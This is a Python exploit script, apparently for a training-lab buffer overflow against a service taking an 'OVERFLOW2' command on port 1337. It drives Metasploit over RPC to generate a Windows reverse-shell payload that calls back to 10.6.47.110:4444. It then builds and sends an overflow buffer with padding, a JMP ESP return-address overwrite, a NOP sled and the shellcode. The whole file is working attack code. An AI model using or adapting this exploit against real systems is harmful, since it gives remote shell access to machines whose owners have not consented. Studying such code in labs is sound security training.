#!/usr/bin/python

import sys,socket,struct
import os
from pymetasploit3.msfrpc import MsfRpcClient

def shellcode_generator():
        '''Uses Python3 Metasploit automation library to generate a shellcode as if using command: 
        msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNCT=thread -b '\x00\x23\x3c\x83\xba' -f py 

        You will need to start the Metasploit RPC server on port 55553 by using a password:
        $ msfrpcd -P yourpassword -S '''

        #Connects with Metasploit's RPC server 
        client = MsfRpcClient ('yourpassword', port=55553)  #Modify this field with your password. 
              
        #Generates a payload module object
        payload = client.modules.use('payload', 'windows/shell_reverse_tcp')

        #Set mandatory options
        payload['LHOST'] = '10.6.47.110'
        payload['LPORT'] = 4444
        payload['EXITFUNC'] = 'thread'
        
        #Set additional options such as bad chars found
        payload.runoptions['BadChars'] = b'\x00\x23\x3c\x83\xba'
        payload.runoptions['Format'] = 'py'
        
        #Generate the payload
        data = payload.payload_generate()
              
        #Optional feature to write the shellcode to a file in your pwd.
        if isinstance(data, str):
                print(data)
        else:
                with open('test', 'wb') as f:
                        f.write(data)
        
        return data.decode()

      
IP="10.10.226.153"                                      
port=1337                                               
SRP_offset = 634  
pointer_JMP_ESP = 0x625011AF 
padding = ("\x90" * 16).encode()

payload = shellcode_generator()

buff = b"OVERFLOW2 "                                    #Prefix
buff += ("A" * SRP_offset).encode()                     #Padding
buff += struct.pack("<I", pointer_JMP_ESP)              #SRP overwrite
buff += padding                                         # ESP points here 
buff += payload                                         #Shellcode
buff += b"\r\n"

try:
                            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((IP,port))
                            s.send ((buff))
                            s.close()
              
except:
                            print ("Error connecting to server")
                            sys.exit()
